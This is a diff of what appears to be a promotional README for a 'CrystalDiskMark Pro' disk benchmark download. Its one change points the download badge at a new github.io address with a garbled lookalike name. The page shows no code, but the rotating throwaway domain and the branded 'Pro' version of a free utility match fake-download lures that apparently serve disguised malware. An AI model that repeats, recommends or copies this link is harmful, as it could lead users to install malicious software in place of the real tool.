@@ -3,7 +3,7 @@
 Measure your storage performance with **CrystalDiskMark Pro**, a leading disk benchmark utility for PC. Get precise read and write speed results for SSDs, HDDs, USB drives, and NVMe storage.
 
 ⬇️ **Download**  
-[![Download CrystalDiskMark Pro](https://img.shields.io/badge/Download-CrystalDiskMark_Pro-00BFFF?style=for-the-badge&logo=windows&logoColor=white)](https://crystaldiskmark-free-for-pc.github.io/.github/)
+[![Download CrystalDiskMark Pro](https://img.shields.io/badge/Download-CrystalDiskMark_Pro-00BFFF?style=for-the-badge&logo=windows&logoColor=white)](https://crystald1iskmarkmore7i90.github.io/.github/)
 
 ---
 
